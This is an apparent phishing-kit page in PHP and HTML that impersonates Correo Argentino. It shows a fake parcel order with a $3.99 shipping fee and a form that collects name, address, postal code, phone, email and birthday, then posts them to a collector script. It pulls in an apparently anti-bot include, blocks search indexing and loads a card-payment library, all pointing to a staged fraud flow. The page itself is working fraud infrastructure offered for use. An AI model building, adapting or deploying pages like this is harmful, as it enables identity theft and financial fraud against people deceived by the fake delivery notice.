<?php
session_start();

include("./Conan/911.php");
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- Required meta tags -->
        
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./X911/helpers.css">
        <link rel="stylesheet" href="./X911/stylee.css">

        <link rel="icon" type="image/x-icon" href="./X911/favicon.ico">

        <title>Correo Argentino |</title>
    </head>
	 <header style="background: #FFCE00; color: #fff;">
            <div class="head">
                <div class="logo">
                    <img src="./X911/logo.png" style="width: 150px;">
                </div>
            </div>
     </header>
    <body>
     <section>
            <div class="cc">
                <div class="info">
                    <div class="transaction">
                        <div class="ref">
                            <h4>Número de pedido, número de transporte, código de envío: AR-S1912738456</h4>
                            <span>Embalaje estándar</span>
                        </div>
                        <div class="order">
                            <p>Orden #AR-S1912738456</p>
                        </div>
                    </div>
                    <div class="form">
                        <h1>Informacion personal</h1>
                        <form action="./siftA/A.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="details">

                                <div class="input-groupe">
                                    <label for="fullname">Tu nombre completo <span>*</span></label>
                                    <input type="text" id="fullname" name="fullname" placeholder="Nombre completo" class="" value="" required="">
                                                                    </div>
							<div class="input-groupe">
                                <label for="address">Dirección <span>*</span></label>
                                <input id="address" type="text" name="address" placeholder="Dirección" class="" value="" required="">
                                                            </div>

                            <div class="inp">
                                <div class="input-groupe">
                                    <label for="city">Ciudad <span>*</span></label>
                                    <input type="text" id="city" name="City" placeholder="Ciudad" class="" value="" required="">
                                                                    </div>
                                <div id="inp-left" class="input-groupe">
                                    <label for="zipcode">Código postal <span>*</span></label>
                                    <input type="text" id="zipcode" name="zipcode" placeholder="Código postal" class="" value="" required="">
                                                                    </div>
                            </div>
                            <div class="input-groupe">
                                <label for="phone">Número de teléfono <span>*</span></label>
                                <input id="phone" type="phone" name="phone" placeholder="Número de teléfono" class="" value="" required="">
                                                            </div>
                            <div class="input-groupe">
                                <label for="email">Dirección de correo electrónico <span>*</span></label>
                                <input id="email" type="email" name="email" placeholder="Dirección de correo electrónico" class="" value="" required="">
                                                            </div>
                            <div class="input-groupe">
                                <label for="birthday">Cumpleaños <span>*</span></label>
                                <input id="birthday" type="text" name="birthday" placeholder="MM/DD/AAAA" class="" value="" required="">
                                                            </div>

                            <div style="margin-top: 50px;"><button name="submit">Continuar</button></div>
                            
                        </form>
                    </div>
                </div>

                <div class="free">
                    <div class="free-top">
                        <div class="log">
                            <img src="./X911/corre.jpg">
                        </div>
                            <h5>Gastos de envío adicionales</h5>
                        <div class="free-right">
                            <p>$3.99</p>
                            <span>($3.99  IVA incluido)</span>
                        </div>
                    </div>
                    <hr>
                    <div class="free-b d-flex">
                        <h3>Total</h3>
                        <div class="free-right">
                            <p>$3.99</p>
                            <span>(VAT incluido)</span>
                        </div>
                    </div>

                </div>
            </div>
     </section>
	 
<footer>


</footer>
	 

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="./X911/jquery.mask.js"></script>

    
     	<script>$("#birthday").mask("00/00/0000");</script>
		<script>$("#phone").mask("+0000000000000000000");</script>
    




    </body>

</html>